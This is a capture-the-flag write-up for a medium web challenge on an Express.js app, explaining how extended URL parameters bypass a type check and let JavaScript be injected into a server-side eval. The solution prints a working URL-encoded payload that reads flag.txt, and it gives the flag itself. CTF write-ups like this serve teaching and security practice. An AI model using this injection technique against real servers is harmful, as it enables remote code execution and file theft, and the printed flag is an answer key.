# Title

## Authors

-   @stacksparrow4

## Category

-   Web

## Description

Express for nodejs is all the rage these days. Surely that means it's secure.

`https://extended.ctf.secso.cc/`

NOTE: this should go without saying but do not modify the challenge in any way
that can stop other ctf players from completing it. Such actions will be
punished accordingly.

## Difficulty

-   Medium

## Points

080

## Files

-   [extended.zip](./_ctfd/files/extended.zip): the source code of the challenge

## Solution

<details>
<summary>Spoiler</summary>

### Idea

Express JS defaults to enabling extended url parameters when using the
`express.urlencoded()` middleware. Developers often do not expect this which can
lead to edge cases.

### Walkthrough

1. Looking at the provided source code, we see that our target is to reach the eval statement with malicious input
1. We can control num2 (and num1) however it is verified that num2 is a number which cannot be used maliciously
1. To bypass the check for num2.constructor.name we can utilise exteneded url parameters. Modifying the query string to
   `?num1=1&op=add&num2[constructor][name]=Number` bypasses this check
1. Next we need to figure out how to inject code into the eval. Our object is passed through JSON.stringify into some single quotes
   so we can simply break out of these single quotes to evaluate javascript on the server.
1. The code we want to evaluate is

```javascript
res.send(require("fs").readFileSync("./flag.txt", "utf8"));
```

which will send the flag back to the client. To get this to execute when evaled we can wrap it in a function that calls itself:

```javascript
(function () {
    res.send(require("fs").readFileSync("./flag.txt", "utf8"));
})();
```

Note we must use single quotes as JSON escapes double quotes.

1. To complete the payload we break out of the single quote strings by adding `' + ` and `+ '` and url encode the payload.
   Inserting this payload into a new key of the object will execute the code. This gives us the following
   url as an exploit:
   `http://localhost:3000/math?num1=1&op=add&num2[constructor][name]=Number&num2[a]=%27%2B%28function%20%28%29%20%7Bres%2Esend%28require%28%27fs%27%29%2EreadFileSync%28%27%2E%2Fflag%2Etxt%27%2C%20%27utf8%27%29%29%7D%29%28%29%2B%27`
   Which returns us the flag.

### Flag

`SKYLIGHT{expr3ss_ext3nded$_encodiNg_can_b3_d4Ngerous}`

</details>
